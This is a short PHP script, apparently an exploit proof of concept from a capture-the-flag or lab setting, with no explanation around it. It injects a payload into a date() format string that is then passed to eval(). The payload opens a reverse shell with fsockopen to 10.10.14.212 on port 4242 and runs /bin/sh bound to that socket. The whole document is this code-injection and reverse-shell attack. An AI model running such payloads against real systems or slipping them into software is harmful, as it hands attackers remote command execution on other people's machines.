<?php
    $format = "r\"); \$sock=fsockopen(\"10.10.14.212\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");//";
    $a = '$time = date("' . $format . '", strtotime("10 day 9 hour 8 minute 7 second"));';
    echo $a;
    eval($a);

    echo "\n";
?>
